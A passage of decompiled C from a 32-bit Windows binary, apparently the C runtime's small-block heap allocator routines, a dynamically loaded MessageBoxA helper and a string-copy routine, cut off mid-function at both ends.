      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar2 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
            *puVar2 = *puVar2 & uVar13;
            pcVar1 = (char *)((int)puVar11 + uVar5 + 4);
            *pcVar1 = *pcVar1 + -1;
            if (*pcVar1 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar2 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
            *puVar2 = *puVar2 & uVar13;
            pcVar1 = (char *)((int)puVar11 + uVar5 + 4);
            *pcVar1 = *pcVar1 + -1;
            if (*pcVar1 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      puVar12[1] = piVar3[(int)puVar10 * 2 + 1];
      puVar12[2] = (uint)(piVar3 + (int)puVar10 * 2);
      (piVar3 + (int)puVar10 * 2)[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar4 = *(char *)((int)puVar10 + uVar5 + 4);
        *(char *)((int)puVar10 + uVar5 + 4) = cVar4 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar4 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar4 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar3 = *piVar3 + -1;
    if (*piVar3 == 0) {
      if (DAT_0045f7f4 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_0045f7ec * 0x8000 + DAT_0045f7f4[3]),0x8000,0x4000);
        DAT_0045f7f4[2] = DAT_0045f7f4[2] | 0x80000000U >> ((byte)DAT_0045f7ec & 0x1f);
        *(undefined4 *)(DAT_0045f7f4[4] + 0xc4 + DAT_0045f7ec * 4) = 0;
        *(char *)(DAT_0045f7f4[4] + 0x43) = *(char *)(DAT_0045f7f4[4] + 0x43) + -1;
        if (*(char *)(DAT_0045f7f4[4] + 0x43) == '\0') {
          DAT_0045f7f4[1] = DAT_0045f7f4[1] & 0xfffffffe;
        }
        if (DAT_0045f7f4[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_0045f7f4[3],0,0x8000);
          HeapFree(DAT_0045fa28,0,(LPVOID)DAT_0045f7f4[4]);
          FUN_0045ec70(DAT_0045f7f4,DAT_0045f7f4 + 5,
                       (DAT_0045f7f8 * 0x14 - (int)DAT_0045f7f4) + -0x14 + DAT_0045f7fc);
          DAT_0045f7f8 = DAT_0045f7f8 + -1;
          if (DAT_0045f7f4 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0045f7f0 = DAT_0045f7fc;
        }
      }
      DAT_0045f7f4 = param_1;
      DAT_0045f7ec = uVar14;
    }
  }
  return;
}



int * __cdecl FUN_0045da2b(uint *param_1)

{
  char *pcVar1;
  int *piVar2;
  char cVar3;
  int *piVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  int *piVar11;
  uint *puVar12;
  uint *puVar13;
  int iVar14;
  uint local_10;
  uint local_c;
  int local_8;
  
  puVar8 = DAT_0045f7fc + DAT_0045f7f8 * 5;
  uVar6 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar7 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar5 = (byte)iVar7;
  if (iVar7 < 0x20) {
    local_10 = 0xffffffff >> (bVar5 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    local_c = 0xffffffff >> (bVar5 - 0x20 & 0x1f);
    local_10 = 0;
  }
  param_1 = DAT_0045f7f0;
  if (DAT_0045f7f0 < puVar8) {
    do {
      if ((param_1[1] & local_c | *param_1 & local_10) != 0) break;
      param_1 = param_1 + 5;
    } while (param_1 < puVar8);
  }
  puVar12 = DAT_0045f7fc;
  if (param_1 == puVar8) {
    for (; (puVar12 < DAT_0045f7f0 && ((puVar12[1] & local_c | *puVar12 & local_10) == 0));
        puVar12 = puVar12 + 5) {
    }
    param_1 = puVar12;
    if (puVar12 == DAT_0045f7f0) {
      for (; (puVar12 < puVar8 && (puVar12[2] == 0)); puVar12 = puVar12 + 5) {
      }
      puVar13 = DAT_0045f7fc;
      param_1 = puVar12;
      if (puVar12 == puVar8) {
        for (; (puVar13 < DAT_0045f7f0 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
        }
        param_1 = puVar13;
        if ((puVar13 == DAT_0045f7f0) && (param_1 = FUN_0045dd34(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar7 = FUN_0045dde5((int)param_1);
      *(int *)param_1[4] = iVar7;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar4 = (int *)param_1[4];
  local_8 = *piVar4;
  if ((local_8 == -1) ||
     ((piVar4[local_8 + 0x31] & local_c | piVar4[local_8 + 0x11] & local_10) == 0)) {
    local_8 = 0;
    puVar8 = (uint *)(piVar4 + 0x11);
    uVar10 = piVar4[0x31] & local_c | piVar4[0x11] & local_10;
    while (uVar10 == 0) {
      puVar12 = puVar8 + 0x21;
      local_8 = local_8 + 1;
      puVar8 = puVar8 + 1;
      uVar10 = *puVar12 & local_c | local_10 & *puVar8;
    }
  }
  iVar7 = 0;
  piVar2 = piVar4 + local_8 * 0x81 + 0x51;
  local_10 = piVar4[local_8 + 0x11] & local_10;
  if (local_10 == 0) {
    local_10 = piVar4[local_8 + 0x31] & local_c;
    iVar7 = 0x20;
  }
  for (; -1 < (int)local_10; local_10 = local_10 << 1) {
    iVar7 = iVar7 + 1;
  }
  piVar11 = (int *)piVar2[iVar7 * 2 + 1];
  iVar9 = *piVar11 - uVar6;
  iVar14 = (iVar9 >> 4) + -1;
  if (0x3f < iVar14) {
    iVar14 = 0x3f;
  }
  DAT_0045f7f0 = param_1;
  if (iVar14 != iVar7) {
    if (piVar11[1] == piVar11[2]) {
      if (iVar7 < 0x20) {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 & 0x1f));
        piVar4[local_8 + 0x11] = uVar10 & piVar4[local_8 + 0x11];
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar10;
        }
      }
      else {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 - 0x20 & 0x1f));
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] & uVar10;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar10;
        }
      }
    }
    *(int *)(piVar11[2] + 4) = piVar11[1];
    *(int *)(piVar11[1] + 8) = piVar11[2];
    if (iVar9 == 0) goto LAB_0045dcf1;
    piVar11[1] = piVar2[iVar14 * 2 + 1];
    piVar11[2] = (int)(piVar2 + iVar14 * 2);
    (piVar2 + iVar14 * 2)[1] = (int)piVar11;
    *(int **)(piVar11[1] + 8) = piVar11;
    if (piVar11[1] == piVar11[2]) {
      cVar3 = *(char *)(iVar14 + 4 + (int)piVar4);
      bVar5 = (byte)iVar14;
      if (iVar14 < 0x20) {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar5 & 0x1f);
        }
        piVar4[local_8 + 0x11] = piVar4[local_8 + 0x11] | 0x80000000U >> (bVar5 & 0x1f);
      }
      else {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
        }
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar9 != 0) {
    *piVar11 = iVar9;
    *(int *)(iVar9 + -4 + (int)piVar11) = iVar9;
  }
LAB_0045dcf1:
  piVar11 = (int *)((int)piVar11 + iVar9);
  *piVar11 = uVar6 + 1;
  *(uint *)((int)piVar11 + (uVar6 - 4)) = uVar6 + 1;
  iVar7 = *piVar2;
  *piVar2 = iVar7 + 1;
  if (((iVar7 == 0) && (param_1 == DAT_0045f7f4)) && (local_8 == DAT_0045f7ec)) {
    DAT_0045f7f4 = (uint *)0x0;
  }
  *piVar4 = local_8;
  return piVar11 + 1;
}



undefined4 * FUN_0045dd34(void)

{
  undefined4 *puVar1;
  LPVOID pvVar2;
  
  if (DAT_0045f7f8 == DAT_0045f7e8) {
    pvVar2 = HeapReAlloc(DAT_0045fa28,0,DAT_0045f7fc,(DAT_0045f7e8 * 5 + 0x50) * 4);
    if (pvVar2 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_0045f7e8 = DAT_0045f7e8 + 0x10;
    DAT_0045f7fc = pvVar2;
  }
  puVar1 = (undefined4 *)((int)DAT_0045f7fc + DAT_0045f7f8 * 0x14);
  pvVar2 = HeapAlloc(DAT_0045fa28,8,0x41c4);
  puVar1[4] = pvVar2;
  if (pvVar2 != (LPVOID)0x0) {
    pvVar2 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar1[3] = pvVar2;
    if (pvVar2 != (LPVOID)0x0) {
      puVar1[2] = 0xffffffff;
      *puVar1 = 0;
      puVar1[1] = 0;
      DAT_0045f7f8 = DAT_0045f7f8 + 1;
      *(undefined4 *)puVar1[4] = 0xffffffff;
      return puVar1;
    }
    HeapFree(DAT_0045fa28,0,(LPVOID)puVar1[4]);
  }
  return (undefined4 *)0x0;
}



int __cdecl FUN_0045dde5(int param_1)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  LPVOID pvVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int *lpAddress;
  
  iVar3 = *(int *)(param_1 + 0x10);
  iVar9 = 0;
  for (iVar4 = *(int *)(param_1 + 8); -1 < iVar4; iVar4 = iVar4 << 1) {
    iVar9 = iVar9 + 1;
  }
  iVar8 = 0x3f;
  iVar4 = iVar9 * 0x204 + 0x144 + iVar3;
  iVar5 = iVar4;
  do {
    *(int *)(iVar5 + 8) = iVar5;
    *(int *)(iVar5 + 4) = iVar5;
    iVar5 = iVar5 + 8;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  lpAddress = (int *)(iVar9 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar6 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar6 == (LPVOID)0x0) {
    iVar9 = -1;
  }
  else {
    if (lpAddress <= lpAddress + 0x1c00) {
      piVar7 = lpAddress + 4;
      do {
        piVar7[-2] = -1;
        piVar7[0x3fb] = -1;
        piVar7[-1] = 0xff0;
        *piVar7 = (int)(piVar7 + 0x3ff);
        piVar7[1] = (int)(piVar7 + -0x401);
        piVar7[0x3fa] = 0xff0;
        piVar1 = piVar7 + 0x3fc;
        piVar7 = piVar7 + 0x400;
      } while (piVar1 <= lpAddress + 0x1c00);
    }
    *(int **)(iVar4 + 0x1fc) = lpAddress + 3;
    lpAddress[5] = iVar4 + 0x1f8;
    *(int **)(iVar4 + 0x200) = lpAddress + 0x1c03;
    lpAddress[0x1c04] = iVar4 + 0x1f8;
    *(undefined4 *)(iVar3 + 0x44 + iVar9 * 4) = 0;
    *(undefined4 *)(iVar3 + 0xc4 + iVar9 * 4) = 1;
    cVar2 = *(char *)(iVar3 + 0x43);
    *(char *)(iVar3 + 0x43) = cVar2 + '\x01';
    if (cVar2 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar9 & 0x1f));
  }
  return iVar9;
}



undefined ** FUN_0045dee0(void)

{
  bool bVar1;
  uint **lpAddress;
  LPVOID pvVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined **lpMem;
  
  if (DAT_00457c90 == -1) {
    lpMem = &PTR_LOOP_00457c80;
  }
  else {
    lpMem = (undefined **)HeapAlloc(DAT_0045fa28,0,0x2020);
    if (lpMem == (undefined **)0x0) {
      return (undefined **)0x0;
    }
  }
  lpAddress = (uint **)VirtualAlloc((LPVOID)0x0,0x400000,0x2000,4);
  if (lpAddress != (uint **)0x0) {
    pvVar2 = VirtualAlloc(lpAddress,0x10000,0x1000,4);
    if (pvVar2 != (LPVOID)0x0) {
      if (lpMem == &PTR_LOOP_00457c80) {
        if (PTR_LOOP_00457c80 == (undefined *)0x0) {
          PTR_LOOP_00457c80 = (undefined *)&PTR_LOOP_00457c80;
        }
        if (PTR_LOOP_00457c84 == (undefined *)0x0) {
          PTR_LOOP_00457c84 = (undefined *)&PTR_LOOP_00457c80;
        }
      }
      else {
        *lpMem = (undefined *)&PTR_LOOP_00457c80;
        lpMem[1] = PTR_LOOP_00457c84;
        PTR_LOOP_00457c84 = (undefined *)lpMem;
        *(undefined ***)lpMem[1] = lpMem;
      }
      lpMem[5] = (undefined *)(lpAddress + 0x100000);
      ppuVar3 = lpMem + 6;
      lpMem[3] = (undefined *)(lpMem + 0x26);
      lpMem[4] = (undefined *)lpAddress;
      lpMem[2] = (undefined *)ppuVar3;
      iVar4 = 0;
      do {
        bVar1 = 0xf < iVar4;
        iVar4 = iVar4 + 1;
        *ppuVar3 = (undefined *)((bVar1 - 1 & 0xf1) - 1);
        ppuVar3[1] = (undefined *)0xf1;
        ppuVar3 = ppuVar3 + 2;
      } while (iVar4 < 0x400);
      FUN_0045ea50((uint *)lpAddress,0,0x10000);
      for (; lpAddress < lpMem[4] + 0x10000; lpAddress = lpAddress + 0x400) {
        *(undefined *)(lpAddress + 0x3e) = 0xff;
        *lpAddress = (uint *)(lpAddress + 2);
        lpAddress[1] = (uint *)0xf0;
      }
      return lpMem;
    }
    VirtualFree(lpAddress,0,0x8000);
  }
  if (lpMem != &PTR_LOOP_00457c80) {
    HeapFree(DAT_0045fa28,0,lpMem);
  }
  return (undefined **)0x0;
}



void __cdecl FUN_0045e024(undefined **param_1)

{
  VirtualFree(param_1[4],0,0x8000);
  if ((undefined **)PTR_LOOP_00459ca0 == param_1) {
    PTR_LOOP_00459ca0 = param_1[1];
  }
  if (param_1 != &PTR_LOOP_00457c80) {
    *(undefined **)param_1[1] = *param_1;
    *(undefined **)(*param_1 + 4) = param_1[1];
    HeapFree(DAT_0045fa28,0,param_1);
    return;
  }
  DAT_00457c90 = 0xffffffff;
  return;
}



void __cdecl FUN_0045e07a(int param_1)

{
  BOOL BVar1;
  undefined **ppuVar2;
  int iVar3;
  undefined **ppuVar4;
  undefined **ppuVar5;
  int local_8;
  
  ppuVar4 = (undefined **)PTR_LOOP_00457c84;
  do {
    ppuVar5 = ppuVar4;
    if (ppuVar4[4] != (undefined *)0xffffffff) {
      local_8 = 0;
      ppuVar5 = ppuVar4 + 0x804;
      iVar3 = 0x3ff000;
      do {
        if (*ppuVar5 == (undefined *)0xf0) {
          BVar1 = VirtualFree(ppuVar4[4] + iVar3,0x1000,0x4000);
          if (BVar1 != 0) {
            *ppuVar5 = (undefined *)0xffffffff;
            DAT_0045f654 = DAT_0045f654 + -1;
            if (((undefined **)ppuVar4[3] == (undefined **)0x0) || (ppuVar5 < ppuVar4[3])) {
              ppuVar4[3] = (undefined *)ppuVar5;
            }
            local_8 = local_8 + 1;
            param_1 = param_1 + -1;
            if (param_1 == 0) break;
          }
        }
        iVar3 = iVar3 + -0x1000;
        ppuVar5 = ppuVar5 + -2;
      } while (-1 < iVar3);
      ppuVar5 = (undefined **)ppuVar4[1];
      if ((local_8 != 0) && (ppuVar4[6] == (undefined *)0xffffffff)) {
        ppuVar2 = ppuVar4 + 8;
        iVar3 = 1;
        do {
          if (*ppuVar2 != (undefined *)0xffffffff) break;
          iVar3 = iVar3 + 1;
          ppuVar2 = ppuVar2 + 2;
        } while (iVar3 < 0x400);
        if (iVar3 == 0x400) {
          FUN_0045e024(ppuVar4);
        }
      }
    }
    if ((ppuVar5 == (undefined **)PTR_LOOP_00457c84) || (ppuVar4 = ppuVar5, param_1 < 1)) {
      return;
    }
  } while( true );
}



int __cdecl FUN_0045e13c(undefined *param_1,int **param_2,uint *param_3)

{
  undefined **ppuVar1;
  uint uVar2;
  
  ppuVar1 = &PTR_LOOP_00457c80;
  while ((param_1 <= ppuVar1[4] || (ppuVar1[5] <= param_1))) {
    ppuVar1 = (undefined **)*ppuVar1;
    if (ppuVar1 == &PTR_LOOP_00457c80) {
      return 0;
    }
  }
  if (((uint)param_1 & 0xf) != 0) {
    return 0;
  }
  if (((uint)param_1 & 0xfff) < 0x100) {
    return 0;
  }
  *param_2 = (int *)ppuVar1;
  uVar2 = (uint)param_1 & 0xfffff000;
  *param_3 = uVar2;
  return ((int)(param_1 + (-0x100 - uVar2)) >> 4) + 8 + uVar2;
}



void __cdecl FUN_0045e193(int param_1,int param_2,byte *param_3)

{
  int *piVar1;
  
  piVar1 = (int *)(param_1 + 0x18 + (param_2 - *(int *)(param_1 + 0x10) >> 0xc) * 8);
  *piVar1 = *piVar1 + (uint)*param_3;
  *param_3 = 0;
  piVar1[1] = 0xf1;
  if ((*piVar1 == 0xf0) && (DAT_0045f654 = DAT_0045f654 + 1, DAT_0045f654 == 0x20)) {
    FUN_0045e07a(0x10);
  }
  return;
}



// WARNING: Type propagation algorithm not settling

uint * __cdecl FUN_0045e1d8(int *param_1)

{
  int **ppiVar1;
  undefined **ppuVar2;
  undefined *puVar3;
  int **ppiVar4;
  uint *puVar5;
  uint *puVar6;
  undefined **ppuVar7;
  int *piVar8;
  int **ppiVar9;
  undefined **ppuVar10;
  int local_8;
  
  piVar8 = (int *)PTR_LOOP_00459ca0;
  do {
    if (piVar8[4] != -1) {
      ppiVar9 = (int **)piVar8[2];
      ppiVar4 = (int **)(((int)ppiVar9 + (-0x18 - (int)piVar8) >> 3) * 0x1000 + piVar8[4]);
      if (ppiVar9 < piVar8 + 0x806) {
        do {
          if (((int)param_1 <= (int)*ppiVar9) && (param_1 < ppiVar9[1])) {
            puVar5 = (uint *)FUN_0045e3e0(ppiVar4,*ppiVar9,param_1);
            if (puVar5 != (uint *)0x0) goto LAB_0045e2a3;
            ppiVar9[1] = param_1;
          }
          ppiVar9 = ppiVar9 + 2;
          ppiVar4 = ppiVar4 + 0x400;
        } while (ppiVar9 < piVar8 + 0x806);
      }
      ppiVar1 = (int **)piVar8[2];
      ppiVar4 = (int **)piVar8[4];
      for (ppiVar9 = (int **)(piVar8 + 6); ppiVar9 < ppiVar1; ppiVar9 = ppiVar9 + 2) {
        if (((int)param_1 <= (int)*ppiVar9) && (param_1 < ppiVar9[1])) {
          puVar5 = (uint *)FUN_0045e3e0(ppiVar4,*ppiVar9,param_1);
          if (puVar5 != (uint *)0x0) {
LAB_0045e2a3:
            PTR_LOOP_00459ca0 = (undefined *)piVar8;
            *ppiVar9 = (int *)((int)*ppiVar9 - (int)param_1);
            piVar8[2] = (int)ppiVar9;
            return puVar5;
          }
          ppiVar9[1] = param_1;
        }
        ppiVar4 = ppiVar4 + 0x400;
      }
    }
    piVar8 = (int *)*piVar8;
    if (piVar8 == (int *)PTR_LOOP_00459ca0) {
      ppuVar10 = &PTR_LOOP_00457c80;
      while ((ppuVar10[4] == (undefined *)0xffffffff || (ppuVar10[3] == (undefined *)0x0))) {
        ppuVar10 = (undefined **)*ppuVar10;
        if (ppuVar10 == &PTR_LOOP_00457c80) {
          ppuVar10 = FUN_0045dee0();
          if (ppuVar10 == (undefined **)0x0) {
            return (uint *)0x0;
          }
          piVar8 = (int *)ppuVar10[4];
          *(char *)(piVar8 + 2) = (char)param_1;
          PTR_LOOP_00459ca0 = (undefined *)ppuVar10;
          *piVar8 = (int)(piVar8 + 2) + (int)param_1;
          piVar8[1] = 0xf0 - (int)param_1;
          ppuVar10[6] = ppuVar10[6] + -((uint)param_1 & 0xff);
          return (uint *)(piVar8 + 0x40);
        }
      }
      ppuVar2 = (undefined **)ppuVar10[3];
      local_8 = 0;
      puVar5 = (uint *)(ppuVar10[4] + ((int)ppuVar2 + (-0x18 - (int)ppuVar10) >> 3) * 0x1000);
      puVar3 = *ppuVar2;
      ppuVar7 = ppuVar2;
      for (; (puVar3 == (undefined *)0xffffffff && (local_8 < 0x10)); local_8 = local_8 + 1) {
        ppuVar7 = ppuVar7 + 2;
        puVar3 = *ppuVar7;
      }
      puVar6 = (uint *)VirtualAlloc(puVar5,local_8 << 0xc,0x1000,4);
      if (puVar6 != puVar5) {
        return (uint *)0x0;
      }
      FUN_0045ea50(puVar5,0,0);
      ppuVar7 = ppuVar2;
      if (0 < local_8) {
        puVar6 = puVar5 + 1;
        do {
          *(undefined *)(puVar6 + 0x3d) = 0xff;
          puVar6[-1] = (uint)(puVar6 + 1);
          *puVar6 = 0xf0;
          *ppuVar7 = (undefined *)0xf0;
          ppuVar7[1] = (undefined *)0xf1;
          puVar6 = puVar6 + 0x400;
          ppuVar7 = ppuVar7 + 2;
          local_8 = local_8 + -1;
        } while (local_8 != 0);
      }
      for (; (ppuVar7 < ppuVar10 + 0x806 && (*ppuVar7 != (undefined *)0xffffffff));
          ppuVar7 = ppuVar7 + 2) {
      }
      PTR_LOOP_00459ca0 = (undefined *)ppuVar10;
      ppuVar10[3] = (undefined *)(-(uint)(ppuVar7 < ppuVar10 + 0x806) & (uint)ppuVar7);
      *(char *)(puVar5 + 2) = (char)param_1;
      ppuVar10[2] = (undefined *)ppuVar2;
      *ppuVar2 = *ppuVar2 + -(int)param_1;
      puVar5[1] = puVar5[1] - (int)param_1;
      *puVar5 = (int)(puVar5 + 2) + (int)param_1;
      return puVar5 + 0x40;
    }
  } while( true );
}



int __cdecl FUN_0045e3e0(int **param_1,int *param_2,int *param_3)

{
  int **ppiVar1;
  int **ppiVar2;
  byte bVar3;
  int **ppiVar4;
  int *piVar5;
  int **ppiVar6;
  
  ppiVar2 = (int **)*param_1;
  ppiVar1 = param_1 + 0x3e;
  bVar3 = (byte)param_3;
  if (param_1[1] < param_3) {
    ppiVar4 = (int **)((int)param_1[1] + (int)ppiVar2);
    ppiVar6 = ppiVar2;
    if (*(byte *)ppiVar4 != 0) {
      ppiVar6 = ppiVar4;
    }
    while( true ) {
      while( true ) {
        if (ppiVar1 <= (int **)((int)ppiVar6 + (int)param_3)) {
          ppiVar6 = param_1 + 2;
          while( true ) {
            while( true ) {
              if (ppiVar2 <= ppiVar6) {
                return 0;
              }
              if (ppiVar1 <= (int **)((int)ppiVar6 + (int)param_3)) {
                return 0;
              }
              if (*(byte *)ppiVar6 == 0) break;
              ppiVar6 = (int **)((int)ppiVar6 + (uint)*(byte *)ppiVar6);
            }
            piVar5 = (int *)0x1;
            ppiVar4 = ppiVar6;
            while (ppiVar4 = (int **)((int)ppiVar4 + 1), *(byte *)ppiVar4 == 0) {
              piVar5 = (int *)((int)piVar5 + 1);
            }
            if (param_3 <= piVar5) break;
            param_2 = (int *)((int)param_2 - (int)piVar5);
            ppiVar6 = ppiVar4;
            if (param_2 < param_3) {
              return 0;
            }
          }
          if ((int **)((int)ppiVar6 + (int)param_3) < ppiVar1) {
            *param_1 = (int *)(int **)((int)ppiVar6 + (int)param_3);
            param_1[1] = (int *)((int)piVar5 - (int)param_3);
          }
          else {
            param_1[1] = (int *)0x0;
            *param_1 = (int *)(param_1 + 2);
          }
          *(byte *)ppiVar6 = bVar3;
          ppiVar2 = ppiVar6 + 2;
          goto LAB_0045e4f3;
        }
        if (*(byte *)ppiVar6 == 0) break;
        ppiVar6 = (int **)((int)ppiVar6 + (uint)*(byte *)ppiVar6);
      }
      piVar5 = (int *)0x1;
      ppiVar4 = ppiVar6;
      while (ppiVar4 = (int **)((int)ppiVar4 + 1), *(byte *)ppiVar4 == 0) {
        piVar5 = (int *)((int)piVar5 + 1);
      }
      if (param_3 <= piVar5) break;
      if (ppiVar6 == ppiVar2) {
        param_1[1] = piVar5;
        ppiVar6 = ppiVar4;
      }
      else {
        param_2 = (int *)((int)param_2 - (int)piVar5);
        ppiVar6 = ppiVar4;
        if (param_2 < param_3) {
          return 0;
        }
      }
    }
    if ((int **)((int)ppiVar6 + (int)param_3) < ppiVar1) {
      *param_1 = (int *)(int **)((int)ppiVar6 + (int)param_3);
      param_1[1] = (int *)((int)piVar5 - (int)param_3);
    }
    else {
      param_1[1] = (int *)0x0;
      *param_1 = (int *)(param_1 + 2);
    }
    *(byte *)ppiVar6 = bVar3;
    ppiVar2 = ppiVar6 + 2;
  }
  else {
    *(byte *)ppiVar2 = bVar3;
    if ((int **)((int)ppiVar2 + (int)param_3) < ppiVar1) {
      *param_1 = (int *)((int)*param_1 + (int)param_3);
      param_1[1] = (int *)((int)param_1[1] - (int)param_3);
    }
    else {
      param_1[1] = (int *)0x0;
      *param_1 = (int *)(param_1 + 2);
    }
    ppiVar2 = ppiVar2 + 2;
  }
LAB_0045e4f3:
  return (int)ppiVar2 * 0x10 + (int)param_1 * -0xf;
}



int __cdecl FUN_0045e504(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  HMODULE hModule;
  int iVar1;
  
  iVar1 = 0;
  if (DAT_0045f658 == (FARPROC)0x0) {
    hModule = LoadLibraryA(s_user32_dll_0045a720);
    if (hModule != (HMODULE)0x0) {
      DAT_0045f658 = GetProcAddress(hModule,s_MessageBoxA_0045a714);
      if (DAT_0045f658 != (FARPROC)0x0) {
        DAT_0045f65c = GetProcAddress(hModule,s_GetActiveWindow_0045a704);
        DAT_0045f660 = GetProcAddress(hModule,s_GetLastActivePopup_0045a6f0);
        goto LAB_0045e553;
      }
    }
    iVar1 = 0;
  }
  else {
LAB_0045e553:
    if (DAT_0045f65c != (FARPROC)0x0) {
      iVar1 = (*DAT_0045f65c)();
      if ((iVar1 != 0) && (DAT_0045f660 != (FARPROC)0x0)) {
        iVar1 = (*DAT_0045f660)(iVar1);
      }
    }
    iVar1 = (*DAT_0045f658)(iVar1,param_1,param_2,param_3);
  }
  return iVar1;
}



uint * __cdecl FUN_0045e590(uint *param_1,uint *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  
  if (param_3 == 0) {
    return param_1;
  }
  puVar5 = param_1;
  if (((uint)param_2 & 3) != 0) {
    while( true ) {
      cVar3 = *(char *)param_2;
      param_2 = (uint *)((int)param_2 + 1);
      *(char *)puVar5 = cVar3;
      puVar5 = (uint *)((int)puVar5 + 1);
      param_3 = param_3 - 1;
      if (param_3 == 0) {
        return param_1;
      }
      if (cVar3 == '\0') break;
      if (((uint)param_2 & 3) == 0) {
        uVar4 = param_3 >> 2;
        goto joined_r0x0045e5ce;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = param_3 >> 2;
        cVar3 = '\0';
        if (uVar4 == 0) goto LAB_0045e60b;
        goto LAB_0045e679;
      }
      *(undefined *)puVar5 = 0;
      puVar5 = (uint *)((int)puVar5 + 1);
      param_3 = param_3 - 1;
    } while (param_3 != 0);
    return param_1;
  }
  uVar4 = param_3 >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *param_2;
      uVar2 = *param_2;
      param_2 = param_2 + 1;
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x0045e675:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_0045e679:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          param_3 = param_3 & 3;
          if (param_3 != 0) goto LAB_0045e60b;
          return param_1;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x0045e675;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x0045e675;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x0045e675;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x0045e5ce:
    } while (uVar4 != 0);
    param_3 = param_3 & 3;
    if (param_3 == 0) {
      return param_1;
    }
  }
  do {
    cVar3 = *(char *)param_2;
    param_2 = (uint *)((int)param_2 + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
